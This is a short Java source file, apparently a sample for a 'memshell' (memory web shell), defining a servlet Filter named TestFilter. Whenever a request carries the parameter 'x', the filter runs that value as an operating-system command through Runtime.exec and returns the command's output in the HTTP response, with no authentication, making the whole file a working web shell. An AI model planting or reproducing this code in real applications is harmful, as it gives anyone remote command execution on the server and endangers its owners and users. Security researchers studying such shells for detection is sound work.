package memshell.Filter;


import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class TestFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("init Filter");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("Filter working on ...");
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        if(request.getParameter("x") != null){
            Process process = Runtime.getRuntime().exec(request.getParameter("x"));
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while((line = reader.readLine()) != null){
                str += line;
            }
            servletResponse.getOutputStream().write(str.getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
    }

    @Override
    public void destroy() {
        System.out.println("destroy");
    }
}
